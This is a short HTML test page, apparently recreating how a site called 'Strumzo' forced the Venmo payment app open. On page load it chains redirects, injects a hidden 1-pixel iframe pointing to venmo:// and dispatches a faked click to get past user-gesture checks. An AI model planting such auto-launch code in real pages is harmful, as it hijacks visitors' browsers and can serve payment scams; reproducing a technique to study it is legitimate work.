<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Venmo App Auto-Open Exploit Test</title>
    <script>
        // Step 1: Create a hidden redirect page first (Mimics Strumzo)
        function firstRedirect() {
            window.location.href = "https://example.com?track=12345"; // Fake tracking step
        }

        // Step 2: Immediately switch to a secondary redirect
        function secondRedirect() {
            window.location.replace("https://example.com/redirect"); // Another quick hop
        }

        // Step 3: Use an iFrame (Mimic the Hidden JS Execution)
        function injectIframe() {
            let iframe = document.createElement("iframe");
            iframe.style.width = "1px";
            iframe.style.height = "1px";
            iframe.style.border = "none";
            iframe.src = "venmo://";
            document.body.appendChild(iframe);
        }

        // Step 4: Dispatch Fake User Interaction (Like Strumzo Likely Did)
        function fakeUserAction() {
            let link = document.createElement("a");
            link.href = "venmo://";
            document.body.appendChild(link);
            let event = new MouseEvent("click", { bubbles: true, cancelable: true, view: window });
            link.dispatchEvent(event);
        }

        // Step 5: Try to Open Venmo (Using All Possible Methods)
        function tryOpenVenmo() {
            setTimeout(firstRedirect, 50);
            setTimeout(secondRedirect, 100);
            setTimeout(injectIframe, 200);
            setTimeout(fakeUserAction, 300);
            setTimeout(() => {
                window.location.href = "venmo://"; // Final step if everything else fails
            }, 400);
        }

        // Auto-execute on page load
        window.onload = function() {
            tryOpenVenmo();
        };
    </script>
</head>
<body>
    <h1>Testing Venmo Auto-Open (Mimicking Strumzo)</h1>
</body>
</html>
